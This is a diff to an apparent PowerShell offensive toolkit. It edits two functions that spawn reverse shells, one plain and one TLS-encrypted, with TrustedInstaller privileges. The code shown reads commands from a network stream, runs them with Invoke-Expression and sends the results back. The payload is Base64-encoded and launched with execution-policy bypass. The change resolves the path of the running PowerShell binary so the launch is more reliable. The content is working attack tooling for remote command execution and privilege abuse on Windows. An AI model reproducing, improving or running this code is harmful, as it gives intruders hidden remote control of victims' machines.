@@ -52,8 +52,10 @@ function Invoke-TIRevShell {
     $shell += '{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS "'
     $shell += ' + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
+    $psbin = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
     $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($shell))
-    Start-Process -FilePath "$Env:PSHOME\powershell.exe" -ArgumentList "-ep", "bypass", "-e", "$encoded"
+
+    Start-Process -FilePath "$psbin" -ArgumentList "-ep", "bypass", "-e", "$encoded"
 }
 
 # Spawns a TLS-encrypted Base64 reverse shell with TI privileges using 'powershell -ep bypass -e'
@@ -83,6 +85,8 @@ function Invoke-TIRevShellTLS {
     $shell += ''
     $shell += ';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'
 
+    $psbin = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
     $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($shell))
-    Start-Process -FilePath "$Env:PSHOME\powershell.exe" -ArgumentList "-ep", "bypass", "-e", "$encoded"
+
+    Start-Process -FilePath "$psbin" -ArgumentList "-ep", "bypass", "-e", "$encoded"
 }
